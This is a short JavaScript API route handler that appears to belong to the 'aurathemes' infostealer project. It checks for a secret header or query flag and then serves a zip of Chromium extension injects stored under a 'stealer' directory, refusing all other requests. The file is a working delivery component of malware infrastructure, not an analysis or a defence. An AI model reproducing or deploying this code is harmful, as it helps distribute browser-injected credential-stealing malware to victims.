import path from 'path';
import fs from 'fs';

const injectPath = 'src/files/scripts/aurathemes.stealer/zip/injects/chromium/extensions.zip';

export default async function handler(req, res) {
  if (req.headers['aurathemes'] === 'true' || req.headers['k4itrun'] === 'true' || req.query.aurathemes === 'true') {
    const filePath = path.join(process.cwd(), injectPath);
    const fileStream = fs.createReadStream(filePath);

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename=${path.basename(filePath)}`);

    fileStream.pipe(res);

    fileStream.on('end', () => {
      console.log('ok');
      res.end();
    });

    fileStream.on('error', (err) => {
      console.error(err);
      res.status(500).end();
    });
  } else {
    res.status(403).json({ error: 'Access denied.' });
  }
}
